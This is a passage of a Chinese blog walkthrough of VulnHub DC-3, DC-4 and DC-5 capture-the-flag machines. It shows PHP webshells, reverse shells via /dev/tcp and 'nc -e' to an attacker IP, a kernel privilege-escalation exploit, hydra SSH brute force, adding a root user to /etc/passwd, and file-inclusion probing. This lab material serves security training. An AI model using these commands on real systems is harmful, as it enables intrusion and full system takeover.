<p>所以根据这个版本看看有没有可以利用的漏洞，来方便我们提权</p>
<blockquote>
<p>还是利用之前用过的<br><code>searchsploit unbuntu 16.04</code></p>
</blockquote>
<p><a data-fancybox="gallery" data-src="/vulnhub/image-20220904093243588.png"><img src="/vulnhub/image-20220904093243588.png" alt="image-20220904093243588"></a></p>
<p><strong>double-fdput()</strong> ,这是运行可执行文件，即可获取<code>root</code>权限</p>
<p>我们把它内容显示出来</p>
<blockquote>
<p>输入<code>searchsploit -p 39772</code>显示文本路径<br>   <code>cat /usr/share/exploitdb/exploits/linux/local/39772.txt</code> 显示内容</p>
</blockquote>
<p><a data-fancybox="gallery" data-src="/vulnhub/image-20220904093849189.png"><img src="/vulnhub/image-20220904093849189.png" alt="image-20220904093849189"></a></p>
<p>在最后看到该漏洞利用的<code>exp</code>下载链接</p>
<p><a data-fancybox="gallery" data-src="/vulnhub/image-20220904095521748.png"><img src="/vulnhub/image-20220904095521748.png" alt="image-20220904095521748"></a></p>
<p>下载最后一个链接的压缩包</p>
<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">https:<span class="regexp">//gi</span>thub.com<span class="regexp">/offensive-security/</span>exploitdb-bin-sploits<span class="regexp">/raw/m</span>aster<span class="regexp">/bin-sploits/</span><span class="number">39772</span>.zip</span><br></pre></td></tr></table></figure>

<p>然后在我们的网站后台上传上去，和创建木马文件时候一样</p>
<p><a data-fancybox="gallery" data-src="/vulnhub/image-20220904101055473.png"><img src="/vulnhub/image-20220904101055473.png" alt="image-20220904101055473"></a></p>
<p>结果报错了</p>
<p><a data-fancybox="gallery" data-src="/vulnhub/image-20220904101159692.png"><img src="/vulnhub/image-20220904101159692.png" alt="image-20220904101159692"></a></p>
<p>看来这个网站上传处是不能上传压缩包文件的</p>
<p>所以我们只能用工具进行直接上传了，比如蚁剑或者菜刀等工具</p>
<p>我们和之前一样新建一个<code>php</code>文件写上我们的一句话木马</p>
<p><a data-fancybox="gallery" data-src="/vulnhub/image-20220904101711601.png"><img src="/vulnhub/image-20220904101711601.png" alt="image-20220904101711601"></a></p>
<p>用蚁剑连接</p>
<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">http</span>://<span class="number">192.168.133.139</span>/templates/protostar/<span class="number">123</span>.php</span><br></pre></td></tr></table></figure>

<p><a data-fancybox="gallery" data-src="/vulnhub/image-20220904101700569.png"><img src="/vulnhub/image-20220904101700569.png" alt="image-20220904101700569"></a></p>
<p>然后把我们的压缩包放在目录下</p>
<p><a data-fancybox="gallery" data-src="/vulnhub/image-20220904112832628.png"><img src="/vulnhub/image-20220904112832628.png" alt="image-20220904112832628"></a></p>
<p>然后返回<code>msf</code></p>
<blockquote>
<p>输入<code>ls</code></p>
</blockquote>
<p><a data-fancybox="gallery" data-src="/vulnhub/image-20220904112929091.png"><img src="/vulnhub/image-20220904112929091.png" alt="image-20220904112929091"></a></p>
<p>发现压缩包已经在里面了</p>
<p>然后解压缩</p>
<blockquote>
<p>输入<code>unzip 39772.zip</code></p>
</blockquote>
<p><a data-fancybox="gallery" data-src="/vulnhub/image-20220904113114803.png"><img src="/vulnhub/image-20220904113114803.png" alt="image-20220904113114803"></a></p>
<p>发现目录下多了个<code>39772</code>的目录</p>
<blockquote>
<p>输入<code>cd 39772</code></p>
</blockquote>
<p><a data-fancybox="gallery" data-src="/vulnhub/image-20220904113213562.png"><img src="/vulnhub/image-20220904113213562.png" alt="image-20220904113213562"></a></p>
<p>发现有两个压缩包，我们利用<code>exploit.tar</code></p>
<blockquote>
<p>输入<code>tar -xvf exploit.tar</code> &#x2F;&#x2F;解压缩</p>
</blockquote>
<p><a data-fancybox="gallery" data-src="/vulnhub/image-20220904113439714.png"><img src="/vulnhub/image-20220904113439714.png" alt="image-20220904113439714"></a></p>
<p>发现多了个<code>ebpf_mapfd_doubleput_exploit</code>目录</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">输入<span class="built_in">cd</span> ebpf_mapfd_doubleput_exploit</span><br></pre></td></tr></table></figure>

<p><a data-fancybox="gallery" data-src="/vulnhub/image-20220904113541560.png"><img src="/vulnhub/image-20220904113541560.png" alt="image-20220904113541560"></a></p>
<p>发现有个<code>compile.sh</code></p>
<p>运行</p>
<blockquote>
<p>输入<code>./compile.sh</code></p>
</blockquote>
<p>发现目录下有多了一个<code>doubleput</code></p>
<p><a data-fancybox="gallery" data-src="/vulnhub/image-20220904113730537.png"><img src="/vulnhub/image-20220904113730537.png" alt="image-20220904113730537"></a></p>
<p>这就是提权文件，运行一下</p>
<blockquote>
<p>输入<code>./doupleput</code></p>
</blockquote>
<p><a data-fancybox="gallery" data-src="/vulnhub/image-20220904114028987.png"><img src="/vulnhub/image-20220904114028987.png" alt="image-20220904114028987"></a></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">输入<span class="built_in">whoami</span>，看看提权成功没</span><br></pre></td></tr></table></figure>

<p><a data-fancybox="gallery" data-src="/vulnhub/image-20220904114119370.png"><img src="/vulnhub/image-20220904114119370.png" alt="image-20220904114119370"></a></p>
<p>提权成功</p>
<p>然后我们到<code>/root</code>目录下查看 <code>flag</code></p>
<p><a data-fancybox="gallery" data-src="/vulnhub/image-20220904114212223.png"><img src="/vulnhub/image-20220904114212223.png" alt="image-20220904114212223"></a></p>
<hr>
<blockquote>
<figure class="highlight gherkin"><table><tr><td class="code"><pre><span class="line">\ \      / /__|<span class="string"> </span>|<span class="string"> </span>|<span class="string"> </span>|<span class="string">  _ \  ___  _ __   ___</span>|<span class="string"> </span>|<span class="string"> </span>|<span class="string"> </span>|<span class="string"> </span>|</span><br><span class="line"> \ \ /\ / / _ \ |<span class="string"> </span>|<span class="string"> </span>|<span class="string"> </span>|<span class="string"> </span>|<span class="string"> </span>|<span class="string">/ _ \</span>|<span class="string"> &#x27;_ \ / _ \ </span>|<span class="string"> </span>|<span class="string"> </span>|<span class="string"> </span>|</span><br><span class="line">  \ V  V /  __/ |<span class="string"> </span>|<span class="string"> </span>|<span class="string"> </span>|<span class="string">_</span>|<span class="string"> </span>|<span class="string"> (_) </span>|<span class="string"> </span>|<span class="string"> </span>|<span class="string"> </span>|<span class="string">  __/_</span>|<span class="string">_</span>|<span class="string">_</span>|<span class="string">_</span>|</span><br><span class="line">   \_/\_/ \___|<span class="string">_</span>|<span class="string">_</span>|<span class="string"> </span>|<span class="string">____/ \___/</span>|<span class="string">_</span>|<span class="string"> </span>|<span class="string">_</span>|<span class="string">\___(_</span>|<span class="string">_</span>|<span class="string">_</span>|<span class="string">_)</span></span><br></pre></td></tr></table></figure>

<p><code>Congratulations are in order.  :-)</code></p>
<p><code>I hope you&#39;ve enjoyed this challenge as I enjoyed making it.</code></p>
<p><code>If there are any ways that I can improve these little challenges,</code><br><code>please let me know.</code></p>
<p><code>As per usual, comments and complaints can be sent via Twitter to @DCAU7</code></p>
<p><code>Have a great day!!!!</code></p>
<p>意思是：</p>
<p>恭喜你，一切正常。：-）</p>
<p>我希望你和我一样喜欢这个挑战。</p>
<p>如果有任何方法可以改善这些小挑战，</p>
<p>请让我知道。</p>
<p>如往常一样，评论和投诉可以通过Twitter发送到@DCAU7</p>
<p>祝你有美好的一天！！！！</p>
</blockquote>
<p><strong>一个旗子找完，游戏结束</strong></p>
<h3 id="法2"><a href="#法2" class="headerlink" title="法2"></a>法2</h3><h4 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a><strong>反弹shell</strong></h4><blockquote>
<p>反弹shell，就是控制端监听在某TCP&#x2F;UDP端口，被控端发起请求到该端口，并将其命令行的输入输出转到控制端。</p>
<p>通俗点说，反弹shell就是一种反向链接，与正向的ssh等不同，它是在对方电脑执行命令连接到我方的攻击模式，并且这种攻击模式必须搭配远程执行命令漏洞来使用。</p>
<p>由于防火墙等限制，对方机器只能发送请求，不能接收请求</p>
<p>对于病毒，木马，受害者什么时候能中招，对方的网络环境是什么样的，什么时候开关机，都是未知，建立一个服务端，让恶意程序主动连接，才是上策。</p>
</blockquote>
<p>和法一一样，我们需要写一个反弹<code>shell</code>的<code>php</code>文件</p>
<blockquote>
<p><code>&lt;?php system(&quot;bash -c &#39;bash -i &gt;&amp; /dev/tcp/192.168.133.140/8888 0&gt;&amp;1&#39;&quot;);?&gt;</code></p>
<p>&#x2F;&#x2F;注意这里的ip为kali的ip，8888为监听的端口</p>
</blockquote>
<p><a data-fancybox="gallery" data-src="/vulnhub/image-20220904115013063.png"><img src="/vulnhub/image-20220904115013063.png" alt="image-20220904115013063"></a></p>
<blockquote>
<p>输入<code>nc -lnvp 8888</code>开始监听<br>然后访问<code>456.php</code><br><code>http://192.168.133.139/templates/protostar/456.php</code></p>
</blockquote>
<p><a data-fancybox="gallery" data-src="/vulnhub/image-20220904130847588.png"><img src="/vulnhub/image-20220904130847588.png" alt="image-20220904130847588"></a></p>
<p>拿到<code>shell</code>，后面提权和法一</p>
<p>一样</p>
<h3 id="法3"><a href="#法3" class="headerlink" title="法3"></a>法3</h3><h4 id="weevely【提权没回显】"><a href="#weevely【提权没回显】" class="headerlink" title="weevely【提权没回显】"></a><strong>weevely</strong>【提权没回显】</h4><blockquote>
<p><code>Weevely</code>是一款使用python编写的webshell工具,集webshell生成和连接于一身,采用c&#x2F;s模式 构建,可以算作是linux下的一款php菜刀替代工具</p>
</blockquote>
<p>生成<code>Shell</code></p>
<blockquote>
<p><code>weevely generate  &lt;文件名&gt;</code></p>
<p><code>weevely generate 123456 shell.php</code></p>
</blockquote>
<p>把生成的内容，复制到我们创建的<code>789.php</code>文件里，和前面两个方法步骤一样</p>
<p>利用触发<code>shell</code></p>
<blockquote>
<p><code>weevely http://192.168.133.139/templates/protostar/789.php 123456</code></p>
<p><code>python -m http.server 9999</code>   </p>
</blockquote>
<p><a data-fancybox="gallery" data-src="/vulnhub/image-20220904133118746.png"><img src="/vulnhub/image-20220904133118746.png" alt="image-20220904133118746"></a></p>
<p>成功进入<code>shell</code></p>
<p>但是当执行提权时</p>
<p><a data-fancybox="gallery" data-src="/vulnhub/image-20220904135935922.png"><img src="/vulnhub/image-20220904135935922.png" alt="image-20220904135935922"></a></p>
<p>报错无法提权，看来是被过滤啥的</p>
<hr>
<h1 id="四、DC-4-初级"><a href="#四、DC-4-初级" class="headerlink" title="四、DC-4[初级]"></a>四、DC-4[初级]</h1><p><strong>only one flag</strong></p>
<h2 id="信息收集-3"><a href="#信息收集-3" class="headerlink" title="信息收集"></a>信息收集</h2><p>先看看靶机端口运行的服务</p>
<p><a data-fancybox="gallery" data-src="/vulnhub/image-20220918190610478.png"><img src="/vulnhub/image-20220918190610478.png" alt="image-20220918190610478"></a></p>
<p>发现有<code>22</code>和<code>80</code>端口，分别运行<code>ssh</code>和<code>http</code></p>
<p>我们先访问<code>80</code>端口</p>
<blockquote>
<p>访问ip：<code>192.168.133.141</code></p>
</blockquote>
<p><a data-fancybox="gallery" data-src="/vulnhub/image-20220918190945726.png"><img src="/vulnhub/image-20220918190945726.png" alt="image-20220918190945726"></a></p>
<p>是一个基本的登录窗口，有提示是<code>admin</code>用户登录界面，所以<strong>可能需要密码爆破登录</strong></p>
<p>我们再利用<code>wappalyzer</code>看一下网站一些基本信息</p>
<p><a data-fancybox="gallery" data-src="/vulnhub/image-20220918194402321.png"><img src="/vulnhub/image-20220918194402321.png" alt="image-20220918194402321"></a></p>
<p>没有啥有用的信息</p>
<h2 id="密码爆破"><a href="#密码爆破" class="headerlink" title="密码爆破"></a>密码爆破</h2><p>然后我们就开始进行密码爆破</p>
<p>已知用户名为<code>admin</code>，只用对密码爆破</p>
<p><a data-fancybox="gallery" data-src="/vulnhub/image-20220918202233098.png"><img src="/vulnhub/image-20220918202233098.png" alt="image-20220918202233098"></a></p>
<p>【字典可以自己找，当然也可以看我学习笔记写的网站下载】</p>
<p>这里我用的<code>top2000.txt</code></p>
<p>最后爆破出密码为<code>happy</code></p>
<p><a data-fancybox="gallery" data-src="/vulnhub/image-20220918203225520.png"><img src="/vulnhub/image-20220918203225520.png" alt="image-20220918203225520"></a></p>
<p>登录试试</p>
<p><a data-fancybox="gallery" data-src="/vulnhub/image-20220918204147349.png"><img src="/vulnhub/image-20220918204147349.png" alt="image-20220918204147349"></a></p>
<p>登录成功，进入<code>Command</code></p>
<p><a data-fancybox="gallery" data-src="/vulnhub/image-20220918204230810.png"><img src="/vulnhub/image-20220918204230810.png" alt="image-20220918204230810"></a></p>
<p>点击<code>run</code>，就会显示上面的数据，看来是命令执行，但是它默认是<code>ls -l</code>，我们试试抓包能修改请求包里的命令吗</p>
<p><a data-fancybox="gallery" data-src="/vulnhub/image-20220918204413877.png"><img src="/vulnhub/image-20220918204413877.png" alt="image-20220918204413877"></a></p>
<p>发现是可以修改的，我们试试<code>whoami</code>命令，看看当前网站登录用户权限</p>
<blockquote>
<p>输入<code>whoami</code></p>
</blockquote>
<p><a data-fancybox="gallery" data-src="/vulnhub/image-20220918204514149.png"><img src="/vulnhub/image-20220918204514149.png" alt="image-20220918204514149"></a></p>
<p>发现是普通用户权限</p>
<p>下面是两个<code>getshell</code>的思路</p>
<hr>
<p><strong>1.</strong></p>
<p>后续查询操作，因为我们可以执行命令，所以也可以利用<code>nc</code><strong>反弹shell</strong>，同样也可以找到用户目录信息</p>
<blockquote>
<p>终端输入<code>nc -l -vv -p 8888</code>，监听8888端口</p>
</blockquote>
<p>抓包数据命令修改为</p>
<blockquote>
<p><code>nc -nv 192.168.133.140 8888 -e /bin/bash</code>   &#x2F;&#x2F;<code>192.168.133.140</code>是虚拟机ip，不是靶机ip</p>
</blockquote>
<p>然后终端就可以执行后续执行命令的类似操作，就是执行的时候可能稍微方便一些</p>
<hr>
<p><strong>2.</strong></p>
<p>我们修改命令，查询<code>/etc/passwd</code>文档（记录每个用户的信息，方便管理员对用户的管理的一个文档）</p>
<blockquote>
<p>输入<code>cat+/etc/passwd</code></p>
</blockquote>
<p><a data-fancybox="gallery" data-src="/vulnhub/image-20220918205535912.png"><img src="/vulnhub/image-20220918205535912.png" alt="image-20220918205535912"></a></p>
<p>发现有三个用户</p>
<blockquote>
<p><code>charles</code><br><code>jim</code><br><code>sam</code></p>
</blockquote>
<p>我们查看这几个用户的目录下有没有我们需要的信息</p>
<p>先访问<code>charles</code></p>
<blockquote>
<p>输入<code>ls+-a+/home/charles</code></p>
</blockquote>
<p><a data-fancybox="gallery" data-src="/vulnhub/image-20220918211049263.png"><img src="/vulnhub/image-20220918211049263.png" alt="image-20220918211049263"></a></p>
<p>感觉没啥有用的信息</p>
<p>再看看<code>jim</code></p>
<blockquote>
<p>输入<code>ls+-a+/home/jim</code></p>
</blockquote>
<p><a data-fancybox="gallery" data-src="/vulnhub/image-20220918211159526.png"><img src="/vulnhub/image-20220918211159526.png" alt="image-20220918211159526"></a></p>
<p>发现关键信息， <code>backups</code>目录和<code>mbox</code>目录，<code>test.sh</code>里面我看了，没啥有用的信息</p>
<p>先看<code>backups</code>目录</p>
<blockquote>
<p>输入<code>ls+-a+/home/jim/backups</code></p>
</blockquote>
<p><a data-fancybox="gallery" data-src="/vulnhub/image-20220918211855793.png"><img src="/vulnhub/image-20220918211855793.png" alt="image-20220918211855793"></a></p>
<p>发现有个<code>old-passwords.bak</code>，这个可能就是登录这三个用户的关键</p>
<p>查看一下内容</p>
<blockquote>
<p>输入<code>cat+/home/jim/old-passwords.bak</code></p>
</blockquote>
<p><a data-fancybox="gallery" data-src="/vulnhub/image-20220918212107439.png"><img src="/vulnhub/image-20220918212107439.png" alt="image-20220918212107439"></a></p>
<p>发现是一个密码表，复制到一个文本文件，当作爆破的密码表</p>
<h2 id="hydra对三用户进行ssh爆破"><a href="#hydra对三用户进行ssh爆破" class="headerlink" title="hydra对三用户进行ssh爆破"></a>hydra对三用户进行ssh爆破</h2><p>我们已经有了密码表<code>（pd.txt）</code>,我们再把三个用户名写到另一个文档里<code>（un.txt）</code></p>
<p>因为之前我们扫描知道，<code>22</code>端口运行着<code>ssh</code>，而<code>80</code>端口我们已经访问了，所以下面端口写<code>22</code></p>
<p>于是</p>
<blockquote>
<p>输入<code>hydra -L un.txt -P pd.txt 192.168.133.141 ssh -s 22</code></p>
</blockquote>
<p>有点久，等一会就行</p>
<p><a data-fancybox="gallery" data-src="/vulnhub/image-20220918214254623.png"><img src="/vulnhub/image-20220918214254623.png" alt="image-20220918214254623"></a></p>
<p>得到<code>jim</code>用户的密码</p>
<blockquote>
<p><code>jibril04</code></p>
</blockquote>
<p>然后我们登录<code>ssh</code></p>
<blockquote>
<p>输入<code>ssh jim@192.168.133.141 -p 22</code></p>
</blockquote>
<p>然后输入密码后，登录成功</p>
<p><a data-fancybox="gallery" data-src="/vulnhub/image-20220918214519470.png"><img src="/vulnhub/image-20220918214519470.png" alt="image-20220918214519470"></a></p>
<p>我们先看看我们能否执行一些管理员命令</p>
<blockquote>
<p>输入<code>sudo -l</code></p>
</blockquote>
<p><a data-fancybox="gallery" data-src="/vulnhub/image-20220918215754640.png"><img src="/vulnhub/image-20220918215754640.png" alt="image-20220918215754640"></a></p>
<p>发现<code>jim</code>用户不能执行任何管理员命令，所以不可能在<code>jim</code>用户上进行提权或其他后续操作</p>
<p>我们仔细一些可以看到</p>
<p><a data-fancybox="gallery" data-src="/vulnhub/image-20220918214603182.png"><img src="/vulnhub/image-20220918214603182.png" alt="image-20220918214603182"></a></p>
<p>说我们有一封邮件，那我们就看看这封用邮件是什么</p>
<p>但我们不知道<code>mail</code>在哪里</p>
<blockquote>
<p>输入<code>find / -name mail</code></p>
</blockquote>
<p><a data-fancybox="gallery" data-src="/vulnhub/image-20220918215012745.png"><img src="/vulnhub/image-20220918215012745.png" alt="image-20220918215012745"></a></p>
<p>找到位置<code>/var/mail</code></p>
<blockquote>
<p>输入<code>cd /var/mail;ls -a</code></p>
</blockquote>
<p><a data-fancybox="gallery" data-src="/vulnhub/image-20220918215052934.png"><img src="/vulnhub/image-20220918215052934.png" alt="image-20220918215052934"></a></p>
<p>发现有一封名为<code>jim</code>的邮件，查看信息</p>
<blockquote>
<p>输入<code>cat jim</code></p>
</blockquote>
<p><a data-fancybox="gallery" data-src="/vulnhub/image-20220918215204901.png"><img src="/vulnhub/image-20220918215204901.png" alt="image-20220918215204901"></a></p>
<p>发现是<code>charles</code>发给<code>jim</code>的邮件</p>
<blockquote>
<p><code>Hi Jim,</code></p>
<p><code>I&#39;m heading off on holidays at the end of today, so the boss asked me to give you my password just in case anything goes wrong.</code></p>
<p><code>Password is:  ^xHhA&amp;hvim0y</code></p>
<p><code>See ya,</code><br><code>Charles</code></p>
<p>翻译：<br>嗨，吉姆，</p>
<p>我今天年底要放假，所以老板让我把密码给你，以防万一。</p>
<p>密码是：^xHhA&amp;hvim0y</p>
<p>再见，<br>查尔斯</p>
</blockquote>
<p>信里提到他自己的密码</p>
<blockquote>
<p><code>^xHhA&amp;hvim0y</code></p>
</blockquote>
<p>于是我们就可以登录<code>charles</code>的账号，所以我们切换用户</p>
<blockquote>
<p>输入<code>su charles</code></p>
</blockquote>
<p>然后输入密码后，登录成功</p>
<p><a data-fancybox="gallery" data-src="/vulnhub/image-20220918215532470.png"><img src="/vulnhub/image-20220918215532470.png" alt="image-20220918215532470"></a></p>
<p>先看看<code>charles</code>能执行什么管理员命令</p>
<blockquote>
<p>输入<code>sudo -l</code></p>
</blockquote>
<p><a data-fancybox="gallery" data-src="/vulnhub/image-20220918220005178.png"><img src="/vulnhub/image-20220918220005178.png" alt="image-20220918220005178"></a></p>
<p>发现<code>charles</code>可以执行管理员的<code>teehee</code>命令</p>
<h2 id="teehee"><a href="#teehee" class="headerlink" title="teehee"></a>teehee</h2><p>我们先需要知道这个命令是干什么的</p>
<blockquote>
<p>输入<code>teehee -h</code></p>
</blockquote>
<p><a data-fancybox="gallery" data-src="/vulnhub/image-20220918220336958.png"><img src="/vulnhub/image-20220918220336958.png" alt="image-20220918220336958"></a></p>
<p><u><strong>发现它是可以修改文件的数据，-a指令能够保证修改文件不会覆盖原有文件</strong></u></p>
<p>那我们需要管理员权限，就可以在<code>/etc/passwd</code>里面添加一个管理员用户数据</p>
<h3 id="添加管理员账户"><a href="#添加管理员账户" class="headerlink" title="添加管理员账户"></a>添加管理员账户</h3><blockquote>
<p>输入<code>sudo teehee -a /etc/passwd</code></p>
</blockquote>
<p><a data-fancybox="gallery" data-src="/vulnhub/image-20220918221258918.png"><img src="/vulnhub/image-20220918221258918.png" alt="image-20220918221258918"></a></p>
<p>然后就等待我们输入数据</p>
<p><a data-fancybox="gallery" data-src="/vulnhub/image-20220918220824224.png"><img src="/vulnhub/image-20220918220824224.png" alt="image-20220918220824224"></a></p>
<p>按照<code>root</code>用户格式，我们添加自己的数据</p>
<blockquote>
<p>输入<br><code>ttoc:</code>(这里是密码，可以加入自己的哈希后的密码，当然不加就可以直接登录，这里我不加，忽略)<code>:0:0:root:/root:/bin/bash</code></p>
</blockquote>
<p><a data-fancybox="gallery" data-src="/vulnhub/image-20220918221714606.png"><img src="/vulnhub/image-20220918221714606.png" alt="image-20220918221714606"></a></p>
<p>添加成功，我们再看看能不能登录，是不是管理员</p>
<p><a data-fancybox="gallery" data-src="/vulnhub/image-20220918221800576.png"><img src="/vulnhub/image-20220918221800576.png" alt="image-20220918221800576"></a></p>
<p>发现是管理员，直接到<code>root</code>目录下，查看 <code>flag</code>即可</p>
<p><a data-fancybox="gallery" data-src="/vulnhub/image-20220918221943297.png"><img src="/vulnhub/image-20220918221943297.png" alt="image-20220918221943297"></a></p>
<blockquote>
<figure class="highlight tap"><table><tr><td class="code"><pre><span class="line">888      <span class="number"> 888 </span>        <span class="number"> 888 </span>888      8888888b.                            <span class="number"> 888 </span>888<span class="number"> 888 </span>888 </span><br><span class="line">888   o  <span class="number"> 888 </span>        <span class="number"> 888 </span>888     <span class="number"> 888 </span> &quot;Y88b                           <span class="number"> 888 </span>888<span class="number"> 888 </span>888 </span><br><span class="line">888  d8b <span class="number"> 888 </span>        <span class="number"> 888 </span>888     <span class="number"> 888 </span>  <span class="number"> 888 </span>                          <span class="number"> 888 </span>888<span class="number"> 888 </span>888 </span><br><span class="line">888 d888b<span class="number"> 888 </span> .d88b. <span class="number"> 888 </span>888     <span class="number"> 888 </span>  <span class="number"> 888 </span> .d88b.  88888b.   .d88b. <span class="number"> 888 </span>888<span class="number"> 888 </span>888 </span><br><span class="line">888d88888b888 d8P  Y8b<span class="number"> 888 </span>888     <span class="number"> 888 </span>  <span class="number"> 888 </span>d88&quot;&quot;88b<span class="number"> 888 </span>&quot;88b d8P  Y8b<span class="number"> 888 </span>888<span class="number"> 888 </span>888 </span><br><span class="line">88888P Y88888<span class="number"> 88888888 </span>888<span class="number"> 888 </span>    <span class="number"> 888 </span>  <span class="number"> 888 </span>888 <span class="number"> 888 </span>888 <span class="number"> 888 </span>88888888 Y8P Y8P Y8P Y8P </span><br><span class="line">8888P   Y8888 Y8b.    <span class="number"> 888 </span>888     <span class="number"> 888 </span> .d88P Y88..88P<span class="number"> 888 </span><span class="number"> 888 </span>Y8b.      &quot;   &quot;   &quot;   &quot;  </span><br><span class="line">888P     Y888  &quot;Y8888 <span class="number"> 888 </span>888      8888888P&quot;   &quot;Y88P&quot; <span class="number"> 888 </span><span class="number"> 888 </span> &quot;Y8888 <span class="number"> 888 </span>888<span class="number"> 888 </span>888 </span><br></pre></td></tr></table></figure>

<p><code>Congratulations!!!</code></p>
<p><code>Hope you enjoyed DC-4.  Just wanted to send a big thanks out there to all those</code><br><code>who have provided feedback, and who have taken time to complete these little</code><br><code>challenges.</code></p>
<p><code>If you enjoyed this CTF, send me a tweet via @DCAU7.</code></p>
<p>意思是<br>恭喜！！！</p>
<p>希望你喜欢 DC-4。只是想向所有这些人表示衷心的感谢<br>谁提供了反馈，谁花时间完成了这些小事<br>挑战。</p>
<p>如果你喜欢这个 CTF，请通过@DCAU7 给我发一条推文。</p>
</blockquote>
<p><strong>一个旗子找完，游戏结束</strong></p>
<hr>
<h1 id="五、DC-5-高级"><a href="#五、DC-5-高级" class="headerlink" title="五、DC-5[高级]"></a>五、DC-5[高级]</h1><p><strong>only one flag</strong></p>
<h2 id="信息收集-4"><a href="#信息收集-4" class="headerlink" title="信息收集"></a>信息收集</h2><p>官方文档里有一些提示说明，我们可以先看一下</p>
<blockquote>
<p><code>As far as I am aware, there is only one exploitable entry point to get in (there is no SSH either). This particular entry point may be quite hard to identify, but it is there. You need to look for something a little out of the ordinary (something that changes with a refresh of a page). This will hopefully provide soKme kind of idea as to what the vulnerability might involve.</code></p>
<p><code>And just for the record, there is no phpmailer exploit involved. :-)</code><br>翻译：<br>据我所知，只有一个可利用的入口点可以进入（也没有 SSH）。这个特定的入口点可能很难识别，但它就在那里。您需要寻找一些与众不同的东西（随着页面的刷新而改变的东西）。这有望为漏洞可能涉及的内容提供某种想法。</p>
<p>只是为了记录，没有涉及 phpmailer 漏洞利用。:-)</p>
<p>&#x3D;&#x3D;&gt;大致关键的信息就是，在我们刷新网页的时候有的东西会发生改变，对应某种漏洞</p>
</blockquote>
<p>养成习惯，先顺手用<code>nmap</code>扫一下靶机端口运行的服务信息</p>
<p><a data-fancybox="gallery" data-src="/vulnhub/image-20220923214221504.png"><img src="/vulnhub/image-20220923214221504.png" alt="image-20220923214221504"></a></p>
<p>发现<code>80</code>端口正常运行着<code>http</code>，<code>54235</code>端口打开</p>
<hr>
<p>我们访问<code>192.168.133.143</code></p>
<p>先习惯看看<code>Wappalyzer</code>基本信息</p>
<p><a data-fancybox="gallery" data-src="/vulnhub/image-20220930190721316.png"><img src="/vulnhub/image-20220930190721316.png" alt="image-20220930190721316"></a></p>
<p>发现<code>Web server</code>是<code>Nginx</code></p>
<p>发现有5个窗口</p>
<p><a data-fancybox="gallery" data-src="/vulnhub/image-20220930190329914.png"><img src="/vulnhub/image-20220930190329914.png" alt="image-20220930190329914"></a></p>
<p>挨个访问，看看有没有可以利用或者交互的地方</p>
<p><a data-fancybox="gallery" data-src="/vulnhub/image-20220930185231350.png"><img src="/vulnhub/image-20220930185231350.png" alt="image-20220930185231350"></a></p>
<p><a data-fancybox="gallery" data-src="/vulnhub/image-20220930191004048.png"><img src="/vulnhub/image-20220930191004048.png" alt="image-20220930191004048"></a></p>
<p>发现<code>Concat</code>窗口下有个输入框，可以实现交互效果，我们乱输入一些数据先试试</p>
<p>看看变化</p>
<p><a data-fancybox="gallery" data-src="/vulnhub/image-20220930191023866.png"><img src="/vulnhub/image-20220930191023866.png" alt="image-20220930191023866"></a></p>
<p>发现<code>url</code>在提交时发生的跳转，并且显示了一些信息</p>
<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">http</span>://<span class="number">192.168.133.143</span>/thankyou.php?firstname=<span class="number">1</span>&amp;lastname=<span class="number">2</span>&amp;country=australia&amp;subject=<span class="number">123</span></span><br></pre></td></tr></table></figure>

<p>看得出来，网站跳转到了<code>thankyou.php</code>，而且我们输入的信息也被以明文方式显示出来了</p>
<p>那怎么利用呢？</p>
<p>我们想起之前作者给的提示，说<strong>刷新的时候会发生变化</strong>，我们刷新看看</p>
<p><a data-fancybox="gallery" data-src="/vulnhub/image-20220930191944460.png"><img src="/vulnhub/image-20220930191944460.png" alt="image-20220930191944460"></a></p>
<p><a data-fancybox="gallery" data-src="/vulnhub/image-20220930191958402.png"><img src="/vulnhub/image-20220930191958402.png" alt="image-20220930191958402"></a></p>
<p>对比两个图可以发现，底下的年份时间发生了改变，<strong>刷新一次，增加一年</strong></p>
<p>这个肯定是有用的，但是怎么利用还是不知道</p>
<p>我们先要了解这个变化肯定是有文件来调用的，而我们肯定是可以访问这个文件的，那我们就需要再次针对性的进行信息收集</p>
<p>用经典的<code>dirsearch</code>来扫一下</p>
<p><a data-fancybox="gallery" data-src="/vulnhub/image-20220930193121068.png"><img src="/vulnhub/image-20220930193121068.png" alt="image-20220930193121068"></a></p>
<p>除去我们已经访问过的文件和响应码403的，发现有一个叫做<code>footer.php</code>文件，刚好和我们的发现变化的那个地方一致，也是<code>底部文本</code>变化</p>
<figure class="highlight dts"><table><tr><td class="code"><pre><span class="line"><span class="symbol">http:</span><span class="comment">//192.168.133.143/footer.php</span></span><br></pre></td></tr></table></figure>

<p><a data-fancybox="gallery" data-src="/vulnhub/image-20220930193446746.png"><img src="/vulnhub/image-20220930193446746.png" alt="image-20220930193446746"></a></p>
<p>发现果然是我们发现变化的那个地方，而且我们刷新时，也会同时变化</p>
<hr>
<h2 id="文件包含"><a href="#文件包含" class="headerlink" title="文件包含"></a>文件包含</h2><p>所以按上面我们推到的思路，和信息的收集，</p>
<p><code>concat.php</code>的底部为了显示和<code>footer.php</code>的实现功能，肯定是实现了文件包含，</p>
<p><code>concat.php</code>把<code>footer.php</code>文件包含了</p>
<p>&#x3D;&#x3D;&gt;我们渗透的基础思路就变成了<strong>利用的文件包含   拿到shell</strong></p>
<h3 id="1-验证我们的想法"><a href="#1-验证我们的想法" class="headerlink" title="1.验证我们的想法"></a>1.验证我们的想法</h3><p>【文件包含注入点可控参数名一般为<code>file</code>，当然如果出现怎么都不行的，那就可以用<code>爆破</code>**(fuzz)**或者我们的思路错误了】</p>
<p>我们先试试能不能包含<code>index.php</code></p>
<figure class="highlight dts"><table><tr><td class="code"><pre><span class="line"><span class="symbol">http:</span><span class="comment">//192.168.133.143/thankyou.php?file=index.php</span></span><br></pre></td></tr></table></figure>

<p><a data-fancybox="gallery" data-src="/vulnhub/image-20220930194734246.png"><img src="/vulnhub/image-20220930194734246.png" alt="image-20220930194734246"></a></p>
<p>发现<code>index.php</code>确实被我们成功包含了，那我们就可以肯定我们的思路是没有偏离了</p>
